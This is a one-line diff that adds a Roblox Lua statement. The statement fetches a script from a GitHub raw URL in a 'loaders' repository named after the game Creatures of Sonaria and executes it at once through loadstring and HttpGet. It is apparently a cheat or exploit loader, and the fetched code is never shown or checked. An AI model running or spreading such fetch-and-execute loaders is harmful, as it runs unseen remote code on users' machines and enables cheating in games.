@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/creatures-of-sonaria-survive-kaiju-anima-spam6-6t7mtx7mgz5a55.lua"))()
